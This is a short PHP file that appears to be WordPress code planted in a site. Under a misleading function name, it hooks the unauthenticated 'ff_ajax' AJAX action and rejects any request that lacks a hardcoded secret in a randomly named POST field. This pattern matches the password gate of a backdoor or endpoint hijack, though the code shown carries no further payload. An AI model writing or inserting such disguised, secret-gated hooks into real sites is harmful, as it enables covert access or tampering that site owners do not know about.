<?php

function reminder_xml_language() {
	if (!isset($_POST["dfvredsgdwa"]) || $_POST["dfvredsgdwa"] !== "yfZN3Zs2QUd4jH") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'reminder_xml_language', 5, 1);
